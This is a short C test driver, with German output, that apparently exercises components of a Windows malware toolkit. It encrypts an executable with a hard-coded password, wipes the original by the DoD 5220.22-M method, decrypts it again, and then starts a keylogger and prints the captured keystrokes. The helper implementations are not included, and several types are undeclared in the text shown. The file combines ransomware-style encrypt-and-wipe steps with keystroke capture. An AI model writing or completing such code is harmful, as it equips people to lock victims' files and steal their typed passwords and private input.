#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

char* startKeylogger();

//For testing
int main() {
    const char* password = "geheimesPasswort";
    EncryptionAlgorithm algo = ALGO_SM4_CBC;    
    const char* inputFile = "putty.exe";

    file_encrypt(inputFile, password, algo);
    printf("Verschlüsselung abgeschlossen: %s.CRYPT\n", inputFile);
    erase("putty.exe", DOD_5220_22_M);


    char encryptedFile[260];
    sprintf_s(encryptedFile, sizeof(encryptedFile), "%s.CRYPT", inputFile);
    file_decrypt(encryptedFile, password, algo);
    erase("putty.exe.CRYPT", DOD_5220_22_M);
    printf("Entschlüsselung abgeschlossen: %s\n", inputFile);
    

    
    char* recordedKeys = startKeylogger();
    if (recordedKeys != NULL) {
        printf("\nRecorded keystrokes: %s\n", recordedKeys);
        free(recordedKeys);
    }

    return 0;
}


